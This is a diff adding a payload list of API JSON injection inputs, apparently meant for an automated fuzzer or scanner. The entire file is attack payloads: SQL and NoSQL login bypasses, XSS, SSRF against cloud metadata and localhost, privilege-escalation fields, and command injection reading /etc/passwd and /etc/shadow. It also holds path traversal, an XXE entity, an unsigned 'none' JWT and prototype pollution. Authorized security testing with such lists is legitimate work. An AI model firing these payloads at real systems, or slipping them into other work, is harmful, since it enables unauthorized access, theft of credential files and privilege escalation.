@@ -1,0 +1,64 @@
+# API JSON Injection Payloads
+# Format: METHOD|PATH|JSON_BODY
+
+# ==== SQL Injection in JSON ====
+POST|/api/user|{"username":"admin'--","password":"test"}
+POST|/api/login|{"user":"' OR '1'='1","pass":"x"}
+POST|/api/search|{"query":"1' UNION SELECT NULL--"}
+POST|/api/filter|{"id":"1 OR 1=1"}
+POST|/api/data|{"where":"id=1' OR '1'='1"}
+
+# ==== NoSQL Injection in JSON ====
+POST|/api/user|{"username":{"$ne":""},"password":{"$ne":""}}
+POST|/api/login|{"username":{"$gt":""},"password":{"$gt":""}}
+POST|/api/search|{"$where":"this.password.match(/.*/)!=null"}
+POST|/api/filter|{"query":{"$regex":".*"}}
+POST|/api/data|{"id":{"$in":[1,2,3]}}
+
+# ==== XSS in JSON ====
+POST|/api/profile|{"name":"<script>alert(1)</script>"}
+POST|/api/comment|{"text":"<img src=x onerror=alert(1)>"}
+POST|/api/message|{"body":"<svg/onload=alert(1)>"}
+POST|/api/update|{"description":"javascript:alert(1)"}
+
+# ==== SSRF via JSON ====
+POST|/api/fetch|{"url":"http://169.254.169.254/latest/meta-data/"}
+POST|/api/webhook|{"callback":"http://127.0.0.1:22"}
+POST|/api/proxy|{"target":"http://internal.local/admin"}
+POST|/api/image|{"src":"http://localhost:8080/admin"}
+
+# ==== Mass Assignment / Privilege Escalation ====
+POST|/api/profile|{"id":1,"role":"admin"}
+POST|/api/user|{"isAdmin":true,"role":"superuser"}
+PUT|/api/account|{"verified":true,"credits":999999}
+PATCH|/api/settings|{"admin":true,"permissions":"*"}
+POST|/api/register|{"username":"test","role":"administrator"}
+
+# ==== Command Injection in JSON ====
+POST|/api/exec|{"cmd":"ls; cat /etc/passwd"}
+POST|/api/ping|{"host":"127.0.0.1; whoami"}
+POST|/api/health|{"target":"`id`"}
+POST|/api/test|{"command":"$(cat /etc/shadow)"}
+
+# ==== Path Traversal in JSON ====
+POST|/api/file|{"path":"../../../../etc/passwd"}
+POST|/api/read|{"filename":"../../../etc/hosts"}
+POST|/api/download|{"file":"....//....//etc/passwd"}
+
+# ==== Template Injection in JSON ====
+POST|/api/render|{"template":"{{7*7}}"}
+POST|/api/email|{"body":"${7*7}"}
+POST|/api/message|{"text":"<%= 7*7 %>"}
+POST|/api/format|{"input":"#{7*7}"}
+
+# ==== XXE via JSON (XML parsing) ====
+POST|/api/import|{"xml":"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}
+
+# ==== JWT Manipulation ====
+POST|/api/auth|{"token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."}
+POST|/api/verify|{"jwt":"header.payload.signature","alg":"none"}
+
+# ==== Prototype Pollution ====
+POST|/api/merge|{"__proto__":{"isAdmin":true}}
+POST|/api/config|{"constructor":{"prototype":{"admin":true}}}
+PUT|/api/settings|{"__proto__":{"polluted":true}}
